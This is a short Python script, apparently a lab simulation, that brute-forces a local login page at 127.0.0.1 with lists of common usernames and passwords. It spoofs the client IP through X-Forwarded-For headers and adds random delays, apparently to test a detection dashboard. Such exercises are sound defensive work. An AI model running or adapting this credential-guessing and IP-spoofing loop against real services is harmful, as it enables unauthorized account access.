import requests
import random
import time
from datetime import datetime

# Configuration
TARGET_URL = "http://127.0.0.1:5000/login"
USERNAMES = ["admin", "guest", "support", "root", "dev"]
PASSWORDS = ["123456", "password", "admin123", "welcome", "qwerty", "password123"]

def generate_random_ip():
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

def run_brute_force_attack(num_attempts=10):
    print(f"--- Starting Attacker AI: Brute Force Simulation ---")
    print(f"Target: {TARGET_URL}")
    print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("-" * 50)

    for i in range(num_attempts):
        username = random.choice(USERNAMES)
        password = random.choice(PASSWORDS)
        spoofed_ip = generate_random_ip()
        
        print(f"[{i+1}/{num_attempts}] Attempting login: {username}:{password} | IP: {spoofed_ip}")
        
        try:
            # We use 'X-Forwarded-For' to simulate different IPs
            headers = {'X-Forwarded-For': spoofed_ip}
            data = {'username': username, 'password': password}
            
            response = requests.post(TARGET_URL, data=data, headers=headers, timeout=5)
            
            # Check if login was successful (usually a redirect or a session cookie)
            if response.url == "http://127.0.0.1:5000/" or response.url == "http://127.0.0.1:5000":
                print(f"  --> SUCCESS! Cracked credentials: {username}:{password}")
                break
            else:
                print(f"  --> Failed.")
                
        except Exception as e:
            print(f"  --> Error: {e}")
        
        # Random interval between attempts (0.5 to 3 seconds)
        sleep_time = random.uniform(0.5, 3.0)
        time.sleep(sleep_time)

    print("-" * 50)
    print("Simulation Complete. Check the Dashboard for logs.")

if __name__ == "__main__":
    # Run the attack with 15 random attempts
    run_brute_force_attack(15)
